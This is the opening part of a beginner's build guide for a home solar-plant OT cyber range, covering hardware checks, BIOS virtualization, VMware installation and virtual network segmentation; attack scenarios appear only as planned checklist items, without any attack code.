# Solar Plant OT Cyber Range — COMPLETE BUILD GUIDE v6.0
## The First-Timer's Industrial Standard Playbook
### Every Step. Every Command. Every Reason Why. Every Fix When It Breaks.

**Version 6.0 — Dual-Workstation VMware Edition (Ubuntu 24.04.4 LTS — Fully Verified)**  
**Format:** Chronological, beginner-friendly, fully annotated with troubleshooting  
**Hardware:** Two Workstations (64 GB + 128 GB RAM) + Raspberry Pi 4 Full Kit  
**Hypervisor:** VMware Workstation Pro (Free for Personal Use)  
**OS:** Ubuntu 24.04 LTS (Desktop + Server) + Raspberry Pi OS with Desktop  
**Budget:** $0 — 100% free and open-source stack  

---

> ### How to Use This Guide
>
> This guide is written in strict **chronological order** — do not skip ahead. Each phase
> depends on the one before it. Every command is explained with a "**Why:**" block so you
> understand *what* you are doing and *why* it matters — not just copying blindly.
>
> **Symbols used throughout:**
> - 🔵 **Theory** — conceptual explanation before a step
> - 🟢 **Action** — a command to run or a setting to change
> - 🟡 **Verify** — a test to confirm the step worked
> - 🔴 **Critical** — do not skip; failure here breaks later steps
> - 💡 **Insight** — deeper understanding that helps interviews and real-world work
> - 🛠️ **Troubleshoot** — what to do when things go wrong
>
> **How this guide differs from v5:**
> - **CRITICAL FIX:** All Ubuntu Server VMs now get a TEMPORARY second NAT adapter
>   (VMnet8) during package installation — this is the ONLY way to run `apt install`
>   on Host-Only networked VMs. The adapter is removed after all packages are installed.
>   A universal "Internet for Isolated VMs" procedure is added before each VM build.
> - **CRITICAL FIX:** Ubuntu 24.04.4 LTS installer screens fully re-documented.
>   The 24.04.4 Subiquity installer removed the "Type of install" screen and changed
>   the network, storage, and profile screens — all steps updated accordingly.
> - **CRITICAL FIX:** Netplan empty directory — Ubuntu 24.04.4 Server frequently
>   leaves `/etc/netplan/` completely empty (no `00-installer-config.yaml`).
>   The guide no longer assumes that file exists. Step 8.11 (rename old config)
>   is replaced with a safe "check then create" procedure that works whether
>   the directory is empty or already contains a file.
> - **FIX:** ISO filenames updated to Ubuntu 24.04.4 LTS throughout.
> - **FIX:** All `nmcli` static IP commands updated — `"Wired connection 1"` may
>   not exist on 24.04.4 Server; guide now shows how to find the correct connection name.
> - **FIX:** Historian and SCADA VM creation steps updated to match 24.04.4 installer.
> - **FIX:** `apt update` and package install steps across all VMs now explicitly
>   require the NAT adapter to be active before running.
>
> **How this guide differs from v4:**
> - **CRITICAL FIX:** VMnet2 changed from Host-Only to Bridged — resolves the IP conflict
>   between the VMware host adapter (10.10.10.1) and the Raspberry Pi (10.10.10.1)
> - **CRITICAL FIX:** Field-Simulator VM can now communicate with the Raspberry Pi PLC
>   (previously they were on physically isolated segments and could never talk)
> - **CRITICAL FIX:** pfSense-Internal now includes a VMnet2 interface — enabling
>   routing between SCADA, Historian, and the OT Level-1 network where the Pi lives
> - **CRITICAL FIX:** Raspberry Pi and Field-Simulator gateways corrected — neither
>   should point to the other; both now point to pfSense (10.10.10.254)
> - **CRITICAL FIX:** pfSense-Internal relocated to WS-A consistently throughout
> - **FIX:** Zeek repository corrected from Ubuntu 22.04 to Ubuntu 24.04
> - **FIX:** InfluxDB port corrected to consistently use 8086
> - **FIX:** Raspberry Pi internet access during setup via temporary WiFi
>
> **How this guide differs from v3:**
> - VMware Workstation Pro replaces VirtualBox (more stable, better networking)
> - Ubuntu 24.04 LTS replaces 22.04 (you already downloaded it — correct choice)
> - Raspberry Pi OS with Desktop as primary option (GUI makes it beginner-friendly)
> - Two workstations architecture — VMs are split intelligently between both systems
> - Every step re-verified against actual Ubuntu 24.04 and VMware procedures
> - Full troubleshooting sections added to every phase

---

## IMPORTANT: YOUR HARDWARE SETUP AT A GLANCE

Before diving in, understand what you have and how we'll use it:

```
YOUR HARDWARE INVENTORY
═══════════════════════════════════════════════════════════════
  WORKSTATION A (WS-A)          │  WORKSTATION B (WS-B)
  64 GB RAM                     │  128 GB RAM
  Role: OT Layer VMs + Firewall │  Role: Security & Enterprise VMs
                                │
  VMs running here:             │  VMs running here:
  ├── Field-Simulator           │  ├── Wazuh-SIEM
  ├── SCADA-Server              │  ├── pfSense-External
  ├── Historian                 │  ├── ActiveDirectory
  ├── Bastion-Host              │  ├── ERP-Odoo
  └── pfSense-Internal ← HERE  │  └── RedTeam-Kali
      (routes all OT segments)  │
                                │
  Physical Hardware:            │
  └── Raspberry Pi 4 (PLC)     │
      ETH-PORT-2 of WS-A        │
      (dedicated Pi link)        │
                                │
══════════════════════════════════════════════════════════════
  PHYSICAL NETWORK: WS-A and WS-B connected to same switch/router
  WS-A ETH-PORT-1: Home LAN (internet, WS-B connectivity)
  WS-A ETH-PORT-2: Dedicated direct link to Raspberry Pi ONLY
  VM NETWORK: VMnet2 is BRIDGED to ETH-PORT-2 (Pi segment)
  VM NETWORK: VMnet3–VMnet6 are Host-Only (isolated OT/DMZ/Enterprise)
  VM COMMUNICATION: pfSense-Internal routes between all segments on WS-A
  CROSS-WS TRAFFIC: WS-B VMs use Bridged adapters to reach home LAN/pfSense-Ext
```

**Why split VMs this way?**
- WS-A handles OT traffic (Modbus polling, SCADA queries) — low latency critical
- WS-B handles security analysis (Wazuh indexes terabytes of logs) — RAM heavy
- Splitting prevents one VM from starving others of RAM

---

## MASTER BUILD ORDER

```
WEEK 1 — FOUNDATION
  STEP 0:  Read & plan (this document — invest 30 minutes here)
  STEP 1:  Prepare both workstations (verify hardware)
  STEP 2:  Enable CPU virtualization in BIOS (both WS-A and WS-B)
  STEP 3:  Install VMware Workstation Pro on BOTH workstations
  STEP 4:  Configure VMware networks on BOTH workstations
  STEP 5:  Download all ISOs to a shared location or USB drive

WEEK 2 — RASPBERRY PI & FIELD DEVICES
  STEP 6:  Flash Raspberry Pi OS with Desktop (GUI option)
  STEP 7:  Connect Pi to WS-A and configure networking
  STEP 8:  Create Field-Simulator VM on WS-A (Ubuntu 24.04 Server)
  STEP 9:  Install Python + Modbus libraries (Ubuntu 24.04 method)
  STEP 10: Deploy field device simulator code
  STEP 11: Validate Level 0 — all 6 Modbus devices responding

WEEK 3 — PLC (RASPBERRY PI)
  STEP 12: Install OpenPLC Runtime on Raspberry Pi
  STEP 13: Write PLC control program in Structured Text language
  STEP 14: Configure Modbus slave connections in OpenPLC
  STEP 15: Upload & run PLC program
  STEP 16: Validate Level 1 — PLC reads inverter data correctly

WEEK 4 — SCADA & HMI
  STEP 17: Create SCADA-Server VM on WS-A (Ubuntu 24.04 Desktop)
  STEP 18: Install Java 11 + ScadaBR SCADA software
  STEP 19: Configure data sources and tags in ScadaBR
  STEP 20: Build HMI mimic diagram
  STEP 21: Configure alarms
  STEP 22: Validate Level 2 — SCADA shows live data

WEEK 5 — HISTORIAN & VISUALIZATION
  STEP 23: Create Historian VM on WS-A (Ubuntu 24.04 Server)
  STEP 24: Install InfluxDB 2.x time-series database
  STEP 25: Install Grafana visualization platform
  STEP 26: Connect Grafana to InfluxDB
  STEP 27: Deploy historian data collection script
  STEP 28: Build Grafana solar plant dashboards
  STEP 29: Validate Level 3 — data flowing into historian

WEEK 6-7 — SECURITY INFRASTRUCTURE
  STEP 30: Create pfSense-Internal VM on WS-A (NOT WS-B — see Phase 5 note)
  STEP 31: Configure pfSense network interfaces (5 interfaces including VMnet2)
  STEP 32: Configure firewall rules (IT/OT separation)
  STEP 33: Create Bastion/Jump Server VM on WS-A
  STEP 34: Harden SSH on Bastion Host
  STEP 35: Create Wazuh-SIEM VM on WS-B (Ubuntu 24.04 Server)
  STEP 36: Install Wazuh all-in-one (manager + dashboard)
  STEP 37: Install Wazuh agents on all VMs
  STEP 38: Install and configure Zeek IDS
  STEP 39: Write custom OT detection rules
  STEP 40: Validate DMZ — network segmentation working

WEEK 8 — BUSINESS LAYER
  STEP 41: Create ERP-Odoo VM on WS-B (Ubuntu 24.04 Server)
  STEP 42: Install PostgreSQL + Odoo 17
  STEP 43: Configure Odoo for solar plant operations

WEEK 9 — ENTERPRISE NETWORK
  STEP 44: Create ActiveDirectory VM on WS-B (Windows Server 2022)
  STEP 45: Promote to Domain Controller
  STEP 46: Create OUs, users, and groups
  STEP 47: Create pfSense-External VM on WS-B
  STEP 48: Configure external firewall rules

WEEK 10 — RED TEAM
  STEP 49: Create RedTeam-Kali VM on WS-B
  STEP 50: Install OT-specific attack tools
  STEP 51: Write custom attack scripts

WEEKS 11-12 — ATTACK SCENARIOS & PORTFOLIO
  STEP 52: Execute 5 attack scenarios (Red vs. Blue)
  STEP 53: Document all findings
  STEP 54: Build GitHub portfolio
  STEP 55: Prepare presentation
```

---

# ═══════════════════════════════════════════════════
# PHASE 0 — PRE-BUILD PREPARATION
# ═══════════════════════════════════════════════════

## STEP 0: Read, Plan, and Prepare Your Workspace

### 🔵 Why This Step Exists

Before touching any software, you must understand the full architecture. Many first-timers skip this and build components that don't connect properly — then spend hours debugging networking issues that were architectural mistakes from the start. The 30 minutes you invest here saves days of frustration later.

You are building a **layered system** — exactly like building an actual industrial plant:
- Foundation (networking) must be poured before walls (VMs)
- Walls (VMs) must exist before electricity (applications)
- Electricity (applications) must work before the building is furnished (attack scenarios)

**The Purdue Model — Your Project's Architecture Blueprint:**

```
PURDUE MODEL FOR SOLAR PLANT CYBER RANGE
══════════════════════════════════════════════════════════════════
  LEVEL 4/5: Enterprise Network (IT)
  ├── Active Directory (user management)
  ├── ERP Odoo (business operations: assets, billing, O&M)
  └── Corporate Workstation

  DMZ: Demilitarized Zone (IT/OT Boundary)
  ├── Bastion/Jump Host (only controlled entry to OT)
  └── Wazuh SIEM (security monitoring for BOTH sides)

  LEVEL 3: Operations / Site Network
  └── Historian + Grafana (long-term data storage + dashboards)

  LEVEL 2: Supervisory Control
  ├── SCADA Server (ScadaBR) — operator interface
  └── HMI / Engineering Workstation

  LEVEL 1: Control Devices
  └── Raspberry Pi 4 running OpenPLC Runtime (the PLC)

  LEVEL 0: Field Devices (Physical Process)
  ├── Inverter-1 Simulator (Modbus TCP, port 5501)
  ├── Inverter-2 Simulator (Modbus TCP, port 5502)
  ├── Inverter-3 Simulator (Modbus TCP, port 5503)
  ├── Inverter-4 Simulator (Modbus TCP, port 5504)
  ├── Weather Station Simulator (Modbus TCP, port 5510)
  └── Battery System Simulator (Modbus TCP, port 5520)

  ATTACKER POSITION
  └── Kali Linux (simulates external threat actor)
══════════════════════════════════════════════════════════════════
```

### 🟢 Action: Create Your Build Tracker

Create a file on each workstation's Desktop called `build_tracker.txt`:

```
SOLAR GUARD CYBER RANGE — BUILD TRACKER v6.0
==========================================
Started: [DATE]
WS-A (64GB): [Hostname / LAN IP on home network]
WS-B (128GB): [Hostname / LAN IP on home network]
WS-A ETH-PORT-2 (Pi adapter): 10.10.10.100
Pi IP (OT-LEVEL1-NET): 10.10.10.1
pfSense-Internal OT-L1 gateway: 10.10.10.254

PHASE 0 — PREPARATION
[ ] STEP 0  — Planning complete
[ ] STEP 1  — Both workstations verified (RAM, disk, CPU virt)
[ ] STEP 2  — BIOS virtualization enabled on BOTH
[ ] STEP 3  — VMware Workstation Pro installed on BOTH
[ ] STEP 4  — VMware networks configured on BOTH (matching VMnets)
[ ] STEP 5  — All ISOs downloaded and verified

PHASE 1 — RASPBERRY PI & FIELD DEVICES
[ ] STEP 6  — Raspberry Pi OS with Desktop flashed
[ ] STEP 7  — Pi networking configured (static IP 10.10.10.1)
[ ] STEP 8  — Field-Simulator VM created on WS-A
[ ] STEP 9  — Python venv + pymodbus installed
[ ] STEP 10 — Field simulator code deployed
[ ] STEP 11 — Level 0 validation passed (all 6 devices)

PHASE 2 — PLC
[ ] STEP 12 — OpenPLC installed on Pi
[ ] STEP 13 — PLC ST program written
[ ] STEP 14 — Modbus slaves configured in OpenPLC
[ ] STEP 15 — PLC program uploaded and running
[ ] STEP 16 — Level 1 validation passed

PHASE 3 — SCADA
[ ] STEP 17 — SCADA-Server VM on WS-A
[ ] STEP 18 — Java 11 + ScadaBR installed
[ ] STEP 19 — Data sources + tags configured
[ ] STEP 20 — HMI diagram built
[ ] STEP 21 — Alarms configured
[ ] STEP 22 — Level 2 validation passed

PHASE 4 — HISTORIAN
[ ] STEP 23 — Historian VM on WS-A
[ ] STEP 24 — InfluxDB 2.x running
[ ] STEP 25 — Grafana running
[ ] STEP 26 — Grafana connected to InfluxDB
[ ] STEP 27 — Historian script deployed
[ ] STEP 28 — Dashboards built
[ ] STEP 29 — Level 3 validation passed

PHASE 5 — SECURITY (WS-B)
[ ] STEP 30-32 — pfSense-Internal configured
[ ] STEP 33-34 — Bastion Host hardened
[ ] STEP 35-37 — Wazuh SIEM + all agents
[ ] STEP 38    — Zeek IDS deployed
[ ] STEP 39    — Custom OT rules deployed
[ ] STEP 40    — DMZ validation passed

PHASE 6 — BUSINESS (WS-B)
[ ] STEP 41-43 — ERP Odoo running

PHASE 7 — ENTERPRISE (WS-B)
[ ] STEP 44-46 — Active Directory Domain Controller
[ ] STEP 47-48 — pfSense-External configured

PHASE 8 — RED TEAM (WS-B)
[ ] STEP 49-51 — Kali + OT attack tools ready

SCENARIOS
[ ] Scenario 1 — Modbus Register Injection
[ ] Scenario 2 — SCADA HMI Manipulation
[ ] Scenario 3 — PLC Reprogramming
[ ] Scenario 4 — IT-to-OT Lateral Movement
[ ] Scenario 5 — Historian/SCADA Denial of Service

PORTFOLIO
[ ] GitHub repo created with full documentation
[ ] Screenshots captured for all key moments
[ ] Incident reports written for all 5 scenarios
[ ] Presentation prepared
```

---

## STEP 1: Verify Both Workstations' Hardware

### 🔵 Why This Step Exists

You're running 13+ VMs split across two physical machines. Before installing anything, confirm both machines have what we need. A hardware incompatibility discovered mid-build causes cascading failures across dozens of hours of work.

### 🟢 Action: Check CPU Virtualization on BOTH Machines

Do this on **WS-A** first, then repeat on **WS-B**:

```
Step 1.1: Press Ctrl + Shift + Esc → Task Manager opens
Step 1.2: Click "Performance" tab
Step 1.3: Click "CPU" in the left panel
Step 1.4: Look at the bottom-right of the CPU graph
          You should see: "Virtualization: Enabled"

Possible results:
  "Virtualization: Enabled"  → ✅ Go to Step 1.5
  "Virtualization: Disabled" → ❌ Go to STEP 2 to enable it
  No "Virtualization" entry  → Very old CPU; unlikely but check BIOS anyway
```

### 🟢 Action: Check RAM on Both Workstations

```
Step 1.5: Task Manager → Performance → Memory
          
          WS-A (64 GB machine):
          Total RAM should show: ~64.0 GB
          Available: Should be at least 50 GB when idle
          
          WS-B (128 GB machine):
          Total RAM should show: ~128.0 GB
          Available: Should be at least 110 GB when idle
          
          If available RAM is much lower:
          → Check for background apps consuming memory
          → Close Chrome, Teams, Outlook, etc.
          → If Windows itself shows only 16-32 GB total:
            Check that all RAM sticks are seated properly (physical check)
```

### 🟢 Action: Check Disk Space on Both Workstations

```
Step 1.6: Open File Explorer → This PC
          
          VM disk space breakdown (total across both systems):

          VMs on WS-A:
          ├── Field-Simulator VM:   20 GB
          ├── SCADA-Server VM:      40 GB
          ├── Historian VM:         80 GB  ← InfluxDB data grows over time
          └── Bastion-Host VM:      20 GB
          WS-A Total:              160 GB + buffer = 200 GB free needed

          VMs on WS-B:
          ├── Wazuh-SIEM VM:       120 GB  ← Elasticsearch indexes are massive
          ├── pfSense-Internal VM:  10 GB
          ├── pfSense-External VM:  10 GB
          ├── ActiveDirectory VM:   60 GB  ← Windows Server
          ├── ERP-Odoo VM:          40 GB
          └── RedTeam-Kali VM:      80 GB
          WS-B Total:              320 GB + buffer = 400 GB free needed

💡 Insight: If disk space is tight, store VMs on an external SSD.
   Use USB 3.2 Gen 2 (10 Gbps) minimum — slower USB degrades VM performance.
   A 1 TB external SSD costs ₹4,000-6,000 and works well for VM storage.
```

### 🟡 Verify: Step 1 Checklist

```
WS-A (64 GB):
[ ] CPU virtualization: Enabled
[ ] Total RAM: ~64 GB
[ ] Available RAM: 50+ GB when idle
[ ] Free disk: 200+ GB

WS-B (128 GB):
[ ] CPU virtualization: Enabled
[ ] Total RAM: ~128 GB
[ ] Available RAM: 110+ GB when idle
[ ] Free disk: 400+ GB

Physical:
[ ] Raspberry Pi 4 available with full kit (power supply, SD card, case, cables)
[ ] Ethernet cable to connect Pi to WS-A
[ ] Both workstations on same LAN (same router/switch)
```

---

## STEP 2: Enable CPU Virtualization in BIOS (If Disabled)

### 🔵 Why This Step Exists

VMware Workstation Pro requires hardware-assisted virtualization (Intel VT-x or AMD-V). Without it, VMware won't even install, or VMs will run 10-30× slower. This is why we check first.

**Only do this step if STEP 1 showed "Virtualization: Disabled."**

### 🟢 Action: Enter BIOS Setup

```
Step 2.1: Shut down Windows completely (full shutdown, not Sleep)
          Start → Power → Shut down

Step 2.2: Power on and immediately press the BIOS key:

          ┌──────────────────────────────────────────────┐
          │ Brand        │ BIOS Key                      │
          ├──────────────┼───────────────────────────────┤
          │ Dell         │ F2 (setup) or F12 (boot menu) │
          │ HP           │ F10 or Esc then F10           │
          │ Lenovo       │ F1, F2, or Enter then F1      │
          │ ASUS         │ F2 or Delete                  │
          │ Acer         │ F2 or Delete                  │
          │ MSI          │ Delete                        │
          │ Gigabyte     │ Delete or F2                  │
          │ Custom build │ Delete (99% of motherboards)  │
          └──────────────────────────────────────────────┘

          Press the key REPEATEDLY — once per second — immediately
          after powering on. You have about 3 seconds before Windows
          boot takes over. If you miss it, shut down and try again.
```

### 🟢 Action: Find and Enable Virtualization

```
Step 2.3: Navigate to virtualization setting. Exact path varies by BIOS brand:

          INTEL CPU path (most common):
          Advanced → CPU Configuration → Intel Virtualization Technology → Enabled
          (Also enable: Intel VT-d → Enabled)

          AMD CPU path:
          Advanced → CPU Configuration → SVM Mode → Enabled
          OR: Advanced → AMD CBS → CPU Common Options → SVM Mode → Enabled

          Alternative (some BIOS):
          Security → Virtualization → Intel VT-x → Enabled

Step 2.4: Change setting: Disabled → Enabled
          Navigation: Arrow keys, Enter to select, +/- or F5/F6 to change value

Step 2.5: Save and Exit: F10 → Yes (on most BIOS)
          OR: Exit menu → Save Changes and Exit

Step 2.6: Boot into Windows normally.
          Verify: Task Manager → CPU → "Virtualization: Enabled" ✅
```

### 🛠️ Troubleshoot: BIOS Issues

```
Problem: Can't find the virtualization option
Fix: Search your specific motherboard model + "enable virtualization" online.
     Every BIOS is slightly different. The option always exists on CPUs from 2012+.

Problem: Virtualization was already "Enabled" but VMware still complains
Fix: Also enable Intel VT-d (or AMD IOMMU) in the same BIOS area.
     VMware Pro may require VT-d for certain features.

Problem: Windows 11 boots so fast you can't catch the BIOS key
Fix: Windows 11 → Settings → System → Recovery → Advanced Startup → Restart Now
     → Troubleshoot → Advanced Options → UEFI Firmware Settings → Restart
     This opens BIOS directly from Windows.
```

---

## STEP 3: Install VMware Workstation Pro on BOTH Workstations

### 🔵 Why VMware Instead of VirtualBox?

The guide previously used VirtualBox, which worked fine for most people. However, VMware Workstation Pro is now **completely free for personal use** (since May 2024, Broadcom changed the licensing). VMware offers:

1. **Better performance:** VMware's hypervisor is closer to bare-metal; VMs run noticeably faster
2. **More stable networking:** VMware's Virtual Network Editor is cleaner and more reliable than VirtualBox's networking
3. **Better USB passthrough:** Critical for Raspberry Pi communication over USB-to-serial adapters if needed
4. **Better snapshot performance:** Snapshots are faster and more reliable in VMware
5. **Industry standard:** VMware is what actual data centers and OT environments use for virtualization

**You said VirtualBox is not working on your systems** — VMware Pro is the correct replacement.

### 🟢 Action: Download VMware Workstation Pro (Do on BOTH systems)

```
Step 3.1: Go to: https://support.broadcom.com/
          Click "Software" at the top
          
Step 3.2: You need a free Broadcom account:
          Click "Register" → Fill in details → Confirm email
          This is free. The registration is just Broadcom's gating mechanism.

Step 3.3: After logging in, navigate to:
          My Downloads → VMware Workstation Pro → 
          Select: VMware Workstation Pro 17 (or latest version shown)
          Choose: Windows (for your Windows 11 machines)
          
          Filename: VMware-workstation-full-17.x.x-xxxxxx.exe
          Size: ~600 MB

Step 3.4: ALTERNATIVE direct search if the navigation is confusing:
          Search "VMware Workstation Pro download" → Broadcom developer portal
          Or: https://www.vmware.com/products/desktop-hypervisor/workstation-and-fusion
          → Download Free → Sign in with Broadcom account
```

### 🟢 Action: Install VMware Workstation Pro (Repeat on BOTH WS-A and WS-B)

```
Step 3.5: Right-click the installer → "Run as administrator"
          WHY admin: VMware installs kernel-level drivers (vmnet, vmci).
          These MUST be installed with administrative privileges.

Step 3.6: Follow the installer wizard:
          
          Welcome screen → Next
          
          License Agreement → Accept → Next
          
          Custom Setup:
          ✅ VMware Workstation Pro (required)
          ✅ Enhanced Keyboard Driver (important for Linux VMs)
          ✅ VMware Workstation Server (allows VMs to run as services)
          Leave all defaults → Next
          
          User Experience Settings:
          ☐ Check for product updates on startup → UNCHECK (optional)
          ☐ Help improve VMware → UNCHECK (optional)
          → Next
          
          Shortcuts: Check both Desktop and Start Menu → Next
          
          Ready to Install → Install
          
          Installation takes 3-5 minutes. Network will briefly disconnect
          as VMware installs its virtual adapters (normal).
          
          Finish → Restart Now (IMPORTANT — restart before using VMware)

Step 3.7: After restart, open VMware Workstation Pro
          First time: Confirm it's for "Personal Use" (not Commercial)
          → This is what gives you the free license
          
          VMware opens showing the main window.
          You should see two default networks already configured:
          → VMnet1 (Host-Only: 192.168.111.0/24)
          → VMnet8 (NAT: 192.168.216.0/24)
          These defaults will be reconfigured in STEP 4.
```

### 🛠️ Troubleshoot: VMware Installation Issues

```
Problem: "Installer cannot proceed. Please uninstall Hyper-V"
Fix: Windows features → Disable Hyper-V, Virtual Machine Platform, 
     Windows Hypervisor Platform, Windows Sandbox.
     Restart, then reinstall VMware.
     
     Command method:
     bcdedit /set hypervisorlaunchtype off
     Restart, install VMware, then:
     bcdedit /set hypervisorlaunchtype auto (to re-enable Hyper-V later if needed)

Problem: VMware installs but VMs won't start ("VMX is disabled by BIOS")
Fix: This is the virtualization setting from STEP 2. Go back and enable it.

Problem: Download fails / Broadcom site is slow
Fix: Use a direct link search: "VMware Workstation Pro 17 download site:broadcom.com"
     Or ask in the VMware communities forum for mirror links.
     The file is ~600 MB — allow 10-15 minutes on average internet.

Problem: "Windows cannot verify the publisher of this driver"
Fix: Click "Install this driver software anyway"
     VMware's drivers are legitimate but may not be in Windows' pre-approved list.
```

---

## STEP 4: Configure VMware Virtual Network Editor on BOTH Workstations

### 🔵 Why Networks Must Be Created Before VMs

This is the most important concept in the entire setup: **virtual networks are shared namespaces**. When you assign a VM to "VMnet2 (OT-LEVEL1)", VMware connects it to that virtual switch. If you haven't defined VMnet2 properly, the VM gets wrong connectivity.

**VMware Network Types Explained:**

```
VMware's network modes — what each does:

1. BRIDGED (VMnet0)
   ├── VM gets IP from your real home/office router
   ├── VM appears as a physical device on your LAN
   ├── Useful for cross-workstation VM communication
   └── We use this for: Cross-WS VM traffic when needed

2. NAT (VMnet8 — default)
   ├── VM shares WS's internet connection via NAT translation
   ├── VMs on same VMnet8 can talk to each other
   ├── Your real network cannot see the VMs (they're behind NAT)
   └── We use this for: Kali Linux (attacker needs internet for tool updates)

3. HOST-ONLY (VMnet1 — default, others we create)
   ├── VMs can talk to each other AND to the host Windows machine
   ├── VMs CANNOT reach internet or your real LAN
   ├── Perfect for isolated OT/IT segments
   └── We use this for: All OT and enterprise VMs

4. CUSTOM (VMnet2 through VMnet19)
   ├── Host-only networks you define with specific IP ranges
   ├── Isolated — VMs only see other VMs on the same VMnet number
   └── We use these for: Each network segment (OT-L1, OT-L2, etc.)
```

**Our Network Design:**

```
VMnet ID  │ Name             │ Type                    │ Subnet              │ VMs / Notes
──────────┼──────────────────┼─────────────────────────┼─────────────────────┼────────────────────────────────────
VMnet2    │ OT-LEVEL1-NET    │ BRIDGED (ETH-PORT-2)*   │ 10.10.10.0/24       │ Field-Sim (.10), Pi (.1), pfSense (.254)
VMnet3    │ OT-LEVEL2-NET    │ Host-Only               │ 10.10.20.0/24       │ SCADA (.10), pfSense (.254)
VMnet4    │ OT-LEVEL3-NET    │ Host-Only               │ 10.10.30.0/24       │ Historian (.10), pfSense (.254)
VMnet5    │ DMZ-NET          │ Host-Only               │ 192.168.20.0/24     │ Bastion (.5), Wazuh (.20), pfSense (.1)
VMnet6    │ ENTERPRISE-NET   │ Host-Only               │ 192.168.10.0/24     │ AD (.5), ERP (.20), pfSense-Int (.254)
VMnet8    │ EXTERNAL-NET     │ NAT                     │ 192.168.216.0/24    │ Kali Linux
VMnet1    │ HOST-MGMT        │ Host-Only               │ 192.168.111.0/24    │ Management access from WS host
```

> **\* VMnet2 BRIDGED to ETH-PORT-2:** WS-A must have a SECOND physical Ethernet
> port (or USB-Gigabit adapter) dedicated exclusively to the Raspberry Pi. VMnet2 is
> bridged to THIS port — not to WS-A's main LAN port. This makes the Field-Simulator
> VM appear on the same physical wire as the Pi, enabling direct communication.
> A bridged VMnet has **no VMware host adapter** — so the 10.10.10.1 conflict with
> the Pi's IP never arises. The Pi (10.10.10.1), Field-Sim (10.10.10.10), and
> pfSense's VMnet2 interface (10.10.10.254) are all on the same physical segment.

### 🟢 Action: Open Virtual Network Editor (BOTH workstations)

```
Step 4.1: On WS-A: Open VMware Workstation Pro
          Menu: Edit → Virtual Network Editor

          You'll see the current network list (VMnet0, VMnet1, VMnet8).
          
          ⚠️ IMPORTANT: Click "Change Settings" (bottom right) FIRST.
          This runs Network Editor as administrator — required to modify networks.
          Windows UAC prompt → Yes.
          
          WHY admin required: VMware's virtual networks are kernel-level 
          constructs (like real network adapters). Modifying them requires
          the same admin rights as changing physical network adapters.

Step 4.2: First, change VMnet1 (the default host-only) to our management network:
          Click VMnet1 in the list
          Subnet IP: 192.168.111.0
          Subnet mask: 255.255.255.0
          ☐ Use local DHCP service: UNCHECK (we use static IPs)
          ☐ Connect a host virtual adapter: CHECK (allows WS to reach VMs)
          Click Apply

Step 4.3: Configure VMnet2 — OT-LEVEL1-NET (BRIDGED — CRITICAL):
          
          ⚠️ BEFORE YOU CONFIGURE VMnet2, ENSURE:
          WS-A has a SECOND physical Ethernet port (or USB-Gigabit adapter)
          connected ONLY to the Raspberry Pi. This is ETH-PORT-2.
          It must NOT be your main internet adapter.
          
          Click VMnet2 in the list (or "Add Network" → VMnet2 → OK)
          
          ✅ SELECT: ○ Bridged (connects VMs directly to external network)
          
          In the "Bridged to:" dropdown:
          Select: Your dedicated Pi Ethernet adapter (NOT your main LAN adapter)
          Example: "Realtek PCIe GbE Family Controller #2" or similar
          
          ⚠️ DO NOT choose:
          - "Automatic" (unpredictable — may bridge to wrong adapter)
          - Your main Wi-Fi or LAN adapter (exposes OT VMs to home network)
          
          ☐ Use local DHCP service: UNCHECK
          (Bridged VMnets don't have DHCP — each VM/device uses static IP)
          
          Click Apply
          
          WHY BRIDGED (not Host-Only):
          Host-Only VMnet2 creates a purely virtual network that the physical
          Raspberry Pi CANNOT reach — the Pi is on a physical wire, not a VMware
          virtual switch. By bridging VMnet2 to the dedicated Pi Ethernet port,
          the Field-Simulator VM appears on the SAME physical wire segment as the Pi.
          This is the only way Pi ↔ Field-Simulator communication works.
          
          WHY this eliminates the IP conflict:
          Bridged VMnets do NOT create a VMware host virtual adapter with an IP.
          The conflict (VMware wanting 10.10.10.1 as its host IP AND Pi also using
          10.10.10.1) never happens. The IPs in use are only:
            Pi:                10.10.10.1
            Field-Simulator:   10.10.10.10
            pfSense (later):   10.10.10.254
          Click Apply

Step 4.4: Add VMnet3 — OT-LEVEL2-NET:
          Click "Add Network" → Select VMnet3 → OK
          Host-only
          Subnet IP: 10.10.20.0
          Subnet mask: 255.255.255.0
          ☐ Use local DHCP: UNCHECK
          ✅ Connect host virtual adapter: CHECK
          Click Apply

Step 4.5: Add VMnet4 — OT-LEVEL3-NET:
          Click "Add Network" → Select VMnet4 → OK
          Host-only
          Subnet IP: 10.10.30.0
          Subnet mask: 255.255.255.0
          ☐ Use local DHCP: UNCHECK
          ✅ Connect host virtual adapter: CHECK
          Click Apply

Step 4.6: Add VMnet5 — DMZ-NET:
          Host-only, Subnet: 192.168.20.0, mask: 255.255.255.0
          DHCP: UNCHECK, Host adapter: CHECK

Step 4.7: Add VMnet6 — ENTERPRISE-NET:
          Host-only, Subnet: 192.168.10.0, mask: 255.255.255.0
          DHCP: UNCHECK, Host adapter: CHECK

Step 4.8: VMnet8 already exists (NAT). Configure it:
          Click VMnet8
          ○ NAT (selected — don't change this)
          Subnet IP: 192.168.216.0
          Subnet mask: 255.255.255.0
          ✅ Use local DHCP service: CHECK (Kali needs auto IP from NAT)
          Click "NAT Settings" → verify Gateway IP: 192.168.216.2
          Click OK → Apply → OK to close Network Editor

Step 4.9: REPEAT ALL OF STEPS 4.1 through 4.8 ON WS-B
          The VMnet numbers and IPs must be IDENTICAL on both workstations.
          WHY: When pfSense routes between segments, it needs consistent
          IP addressing regardless of which physical WS hosts the VM.
```

### 🟡 Verify: VMware Network Configuration

```
Step 4.10: On each WS, open Command Prompt (cmd) and type: ipconfig /all

           You should see new virtual adapters:
           VMware Network Adapter VMnet1  → 192.168.111.1
           *** VMnet2 will NOT appear here — it is Bridged, not Host-Only ***
           *** Bridged VMnets create no host virtual adapter — this is correct ***
           VMware Network Adapter VMnet3  → 10.10.20.1
           VMware Network Adapter VMnet4  → 10.10.30.1
           VMware Network Adapter VMnet5  → 192.168.20.1
           VMware Network Adapter VMnet6  → 192.168.10.1
           VMware Network Adapter VMnet8  → 192.168.216.1

           WHY no VMnet2 host adapter: VMnet2 is configured as Bridged to your
           dedicated Pi Ethernet port. Bridged networks work at the Ethernet frame
           level — they pass traffic through to the physical adapter directly.
           No virtual adapter is needed or created on the host.
           
           If you DO see a VMnet2 entry here, it means VMnet2 is still set to
           Host-Only — go back to the Virtual Network Editor and correct it.
```

### 🛠️ Troubleshoot: VMware Networking Issues

```
Problem: "Change Settings" button is greyed out
Fix: Close VMware completely, right-click VMware icon → Run as Administrator
     Then go to Edit → Virtual Network Editor.

